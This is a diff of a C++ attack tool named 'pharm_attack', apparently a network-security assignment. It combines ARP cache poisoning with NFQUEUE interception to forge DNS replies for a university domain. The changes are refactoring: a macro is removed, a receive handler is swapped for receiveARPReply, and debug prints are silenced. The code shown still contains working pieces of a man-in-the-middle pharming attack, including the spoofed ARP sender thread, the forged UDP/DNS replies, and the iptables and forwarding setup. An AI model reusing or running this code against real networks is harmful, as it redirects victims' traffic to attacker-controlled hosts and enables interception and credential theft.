@@ -1,7 +1,6 @@
 #include "pharm_attack.hpp"
 
 // #define INFO 1
-#define MAC_LENGTH 6
 
 void handle_sigint(int sig) {
     system("iptables -F");
@@ -9,7 +8,8 @@ void handle_sigint(int sig) {
     system("sysctl net.ipv4.ip_forward=0 > /dev/null");
     exit(0);
 }
-void setup_forwarding(const char* interface, const char* gateway_ip) {
+
+void setup_forwarding(const char *interface, const char *gateway_ip) {
     char command[100];
 
     // Enable IP forwarding
@@ -68,7 +68,6 @@ void sendUDP(char *data, int len, struct NFQData *info) {
     if (sendto(sd, packet_buffer.data(), len + ETH2_HEADER_LEN, 0, (struct sockaddr *)&info->local_info.device, sizeof(struct sockaddr_ll)) < 0) {
         perror("sendto()");
     }
-    printf("Sent UDP packet\n");
     close(sd);
 
     return;
@@ -154,28 +153,6 @@ void sendDNSReply(unsigned char *payload, int len, int qlen, struct NFQData *inf
     sendUDP(data, resp_mv, info);
 }
 
-// Function to handle receiving responses
-void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
-    uint8_t buffer[IP_MAXPACKET];
-    struct sockaddr saddr;
-    int saddr_len = sizeof(saddr);
-
-    while (true) {
-        // Receive packet
-        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
-        if (bytes < 0) {
-            perror("recvfrom() failed");
-            exit(EXIT_FAILURE);
-        }
-
-        // Check if packet is an ARP packet
-        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
-            parseARPReply(buffer, ip_mac_pairs, local_info);
-        }
-        memset(buffer, 0, IP_MAXPACKET);
-        continue;
-    }
-}
 
 std::string parseDNSQuery(const unsigned char *packet, int dns_start, int &dns_name_length) {
     std::string dns_name;
@@ -227,7 +204,7 @@ static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
     }
     int dns_name_length;
     std::string dns_name = parseDNSQuery(packet, iph_len + udph_len, dns_name_length);
-    printf("dns_name: %s\n", dns_name.c_str());
+    // printf("dns_name: %s\n", dns_name.c_str());
 
     if (dns_name != "wwwnycuedutw") {
         return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
@@ -316,10 +293,10 @@ int main(int argc, char **argv) {
     local_info.device.sll_protocol = htons(ETH_P_IP);
     local_info.device.sll_hatype = htons(ARPHRD_ETHER);
     local_info.device.sll_pkttype = (PACKET_BROADCAST);
-    local_info.device.sll_halen = MAC_LENGTH;
+    local_info.device.sll_halen = 6;  // ethernet header length
     local_info.device.sll_addr[6] = 0x00;
     local_info.device.sll_addr[7] = 0x00;
-    memcpy(local_info.device.sll_addr, local_info.src_mac.data(), MAC_LENGTH);
+    memcpy(local_info.device.sll_addr, local_info.src_mac.data(), 6);
 #ifdef INFO
     printf("src_ip: %s\n", inet_ntoa(local_info.src_ip.sin_addr));
     printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", local_info.src_mac[0], local_info.src_mac[1], local_info.src_mac[2], local_info.src_mac[3], local_info.src_mac[4], local_info.src_mac[5]);
@@ -346,7 +323,7 @@ int main(int argc, char **argv) {
 
     // Start the threads
     std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
-    std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);
+    std::thread receive_thread(receiveARPReply, sd, std::ref(ip_mac_pairs), local_info);
 
     signal(SIGINT, handle_sigint);
 
